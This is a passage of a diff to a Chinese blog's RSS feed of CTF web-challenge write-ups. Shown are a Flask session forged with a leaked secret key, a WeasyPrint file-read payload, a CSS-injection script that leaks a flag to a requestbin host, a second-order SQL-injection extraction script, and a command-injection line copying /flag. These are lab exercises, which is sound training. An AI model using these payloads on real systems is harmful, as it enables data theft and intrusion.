-app &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Flask(__name__)
-app&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;secret_key &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&amp;#39;&lt;/span&gt;
-session_serializer &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; SecureCookieSessionInterface()&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get_signing_serializer(app)
-@app&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;route(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
-&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;index&lt;/span&gt;():
-    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(session_serializer&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;))
-index()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ImFkbWluIg.YZ92Gw.m7Ax9nFV8ULTllJK2X31bEjyCuU&lt;/p&gt;
-&lt;h2 id=&#34;fireshellctf2020url-to-pdf&#34;&gt;[FireshellCTF2020]URL TO PDF&lt;/h2&gt;
-&lt;p&gt;由于刚刚有些无聊所以再开一道&lt;/p&gt;
-&lt;p&gt;开局一个输入框，url转pdf？没见过&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>[安洵杯2019]cssgame</title>
+        <link>https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/</guid>
+        <description>&lt;h2 id=&#34;安洵杯-2019cssgame&#34;&gt;[安洵杯 2019]cssgame&lt;/h2&gt;
+&lt;p&gt;露骨的F12&lt;/p&gt;
 &lt;p&gt;&lt;figure 
 	&gt;
-	&lt;a href=&#34;https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png&#34; &gt;
-		&lt;img src=&#34;https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png&#34;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6240218f27f86abb2a9131ad.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6240218f27f86abb2a9131ad.png&#34;
 			
 			
 			
@@ -2164,52 +2323,92 @@ index()
 	&lt;/a&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;弹出下载，但是没法打开，用010来看，可以看到html，猜测爬虫之类的，可以开个服务器看看请求&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;root@VM-8-15-debian:~# nc -lvp 10004
-listening on [any] 10004 ...
-117.21.200.166: inverse host lookup failed: Unknown host
-connect to [10.0.8.15] from (UNKNOWN) [117.21.200.166] 1519
-GET / HTTP/1.1
-Host: 82.157.174.226:10004
-User-Agent: WeasyPrint 51 (http://weasyprint.org/)
-Accept: */*
-Accept-Encoding: gzip, deflate
-Connection: close
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://websec.readthedocs.io/zh/latest/vuln/xss/trick/cssi.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://websec.readthedocs.io/zh/latest/vuln/xss/trick/cssi.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;CSS注入，如果有机会写任意CSS，那么可以做到&lt;/p&gt;
+&lt;p&gt;1.得到input栏里的token&lt;/p&gt;
+&lt;p&gt;2.得到&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;里的token&lt;/p&gt;
+&lt;p&gt;当然，题里用flag代替token&lt;/p&gt;
+&lt;p&gt;我们这里使用CSS selectors完成攻击&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;/*选择value值为abc的input标签*/
+input[value=&amp;#34;abc&amp;#34;] { }
 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WeasyPrint是啥？没见过&lt;/p&gt;
-&lt;p&gt;WeasyPrint 是一个 Python 的虚拟 HTML 和 CSS 渲染引擎，可以用来将网页转成 PDF 文档。旨在支持 Web 标准的打印。&lt;/p&gt;
-&lt;p&gt;WeasyPrint 会把所有它支持的东西 都请求一遍然后放在 PDF 里，这里出现了漏洞，在 &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt; 标签内 &lt;code&gt;href&lt;/code&gt; 加载 &lt;code&gt;file://&lt;/code&gt; 实现 SSRF + 任意文件读取&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Weasyprint (the library used here) allows including files into the PDF using &lt;code&gt;&amp;lt;link rel=attachment href=&amp;quot;PATH&amp;quot; /&amp;gt;&lt;/code&gt; in the HTML source for the PDF&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;blockquote&gt;
-&lt;p&gt;It’s a documented feature&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;blockquote&gt;
-&lt;p&gt;The information about weasyprint was leaked using a &lt;code&gt;background-image&lt;/code&gt; CSS property to load an attacker-controlled image&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;blockquote&gt;
-&lt;p&gt;The vendor and version (weasyprint 44) were in the HTTP headers&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;开了个docker，写个html&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
-&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
-&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;Captain&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;
-&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
-&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
-&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file:///flag&amp;#39;&lt;/span&gt;&amp;gt;
-&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;网鼎杯-2020-半决赛babyjs&#34;&gt;[网鼎杯 2020 半决赛]BabyJS&lt;/h2&gt;
-&lt;p&gt;快速拔刀（不是）&lt;/p&gt;
+/*选择value值以a开头的input标签 */
+input[value^=&amp;#34;a&amp;#34;] { }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注入代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;input[name=flag][value^=&amp;#34;b&amp;#34;] ~ * {background-image: url(&amp;#34;http://x.x.x.x/b&amp;#34;);}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更换选择的值，选择到了就加载对应的background-image&lt;/p&gt;
+&lt;p&gt;~ *简单理解为防止出现background-image不加载的情况&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;# encoding = utf-8&lt;/span&gt;
+&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; string 
+&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; selenium &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; webdriver	
+&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; time
+
+url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://df3ac406-f5d0-4459-af64-3ff82a3d9f39.node4.buuoj.cn:81/&amp;#39;&lt;/span&gt;
+driver &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;  driver&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;webdriver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;Chrome(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;F:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;chromedriver_win32&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;chromedriver.exe&amp;#34;&lt;/span&gt; )
+flag &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+s &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;digits&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;ascii_letters&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#6272a4&#34;&gt;#可见字符&lt;/span&gt;
+&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; s:
+        flag &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; i
+        string &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;input[name=flag][value^=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;] ~ * {background-image: url(&amp;#34;http://http.requestbin.buuoj.cn/1q89at51/&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;);}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt;(flag, flag)
+        data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;css&amp;#34;&lt;/span&gt;: string}
+        driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(url)
+        css &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;css&amp;#39;&lt;/span&gt;)
+        css&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;send_keys(string)
+        driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;//input[@type=&amp;#39;submit&amp;#39;]&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;click()
+        flag&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;麻了，这个脚本跑多了靶机就没反应了，然后就要重启靶机……神奇&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>[网鼎杯2018]Unfinish</title>
+        <link>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2018unfinish/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2018unfinish/</guid>
+        <description>&lt;h2 id=&#34;网鼎杯2018unfinish&#34;&gt;[网鼎杯2018]Unfinish&lt;/h2&gt;
+&lt;p&gt;二次注入，注入点是在register.php传入的username中。&lt;/p&gt;
+&lt;p&gt;1.猜测语句&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;insert&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;values&lt;/span&gt; (&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2.表名是猜的&lt;/p&gt;
+&lt;p&gt;过滤了information&lt;/p&gt;
+&lt;p&gt;mysql版本是&lt;strong&gt;5.5.64&lt;/strong&gt;，sys 库在&lt;strong&gt;MySQL5.6&lt;/strong&gt;或更高版本才有。&lt;/p&gt;
+&lt;p&gt;3.每次都需要注意换邮箱&lt;/p&gt;
+&lt;p&gt;4.过滤了逗号，不能闭合。&lt;/p&gt;
+&lt;p&gt;要用from for&lt;/p&gt;
+&lt;p&gt;5.+如果被识别成空格，可以用%2B。
+用异或也可以实现&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; bs4 &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; BeautifulSoup
+&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; re
+
+url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/&amp;#39;&lt;/span&gt;
+a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;60&lt;/span&gt;):
+    email &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;eqwews1@131416024w&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i)
+    &lt;span style=&#34;color:#6272a4&#34;&gt;#insert table values (&amp;#39;email&amp;#39;,&amp;#39;username&amp;#39;,&amp;#39;password&amp;#39;)&lt;/span&gt;
+    payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;0&amp;#39; + ascii(substr((select * from flag) from &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i)&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; for 1))+&amp;#39;0&amp;#34;&lt;/span&gt;
+    register &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;:email,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;:payload,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;}
+    login &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;:email,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;}
+    r1 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;register.php&amp;#39;&lt;/span&gt;,data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; register)
+    r2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;login.php&amp;#39;&lt;/span&gt;, data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; login,allow_redirects&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;)
+    soup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; BeautifulSoup(r2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;html.parser&amp;#39;&lt;/span&gt;)
+    a&lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(soup&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;span&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strip()))
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(a)
+
+&lt;span style=&#34;color:#6272a4&#34;&gt;#print(soup.find_all(&amp;#39;span&amp;#39;))&lt;/span&gt;
+&lt;span style=&#34;color:#6272a4&#34;&gt;#print(re.findall(&amp;#34;.*?&amp;lt;/span&amp;gt;&amp;#34;,r2.text)[0].replace(&amp;#39;&amp;lt;/span&amp;gt;&amp;#39;,&amp;#39;&amp;#39;).strip(),end=&amp;#39;&amp;#39;) 不用bs4用re硬找&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
+</description>
+        </item>
+        <item>
+        <title>[网鼎杯2020半决赛]BabyJS</title>
+        <link>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/</guid>
+        <description>&lt;p&gt;快速拔刀（不是）&lt;/p&gt;
 &lt;p&gt;快速找到关键源码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; express &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
 &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; config &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;../config&amp;#39;&lt;/span&gt;);
@@ -2292,6 +2491,236 @@ module.exports &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; router;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个样子：&lt;/p&gt;
 &lt;p&gt;echo  &amp;lsquo;http://a&amp;rsquo;a;cp$IFS/flag$IFS/tmp/log%00&amp;rsquo;&amp;raquo;/tmp/log&lt;/p&gt;
 </description>
+        </item>
+        <item>
+        <title>[网鼎杯2020玄武组]SSRFMe</title>
+        <link>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme/</guid>
+        <description>&lt;h2 id=&#34;网鼎杯-2020-玄武组ssrfme&#34;&gt;[网鼎杯 2020 玄武组]SSRFMe&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;check_inner_ip&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;)
+{
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$match_result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ff79c6&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$match_result&lt;/span&gt;)
+    {
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url fomat error&amp;#39;&lt;/span&gt;);
+    }
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt;
+    {
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url_parse&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+    }
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;catch&lt;/span&gt;(Exception &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$e&lt;/span&gt;)
+    {
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url fomat error&amp;#39;&lt;/span&gt;);
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;;
+    }
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$hostname&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url_parse&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;];
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;gethostbyname(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$hostname&lt;/span&gt;);
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$int_ip&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;ip2long(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ip&lt;/span&gt;);
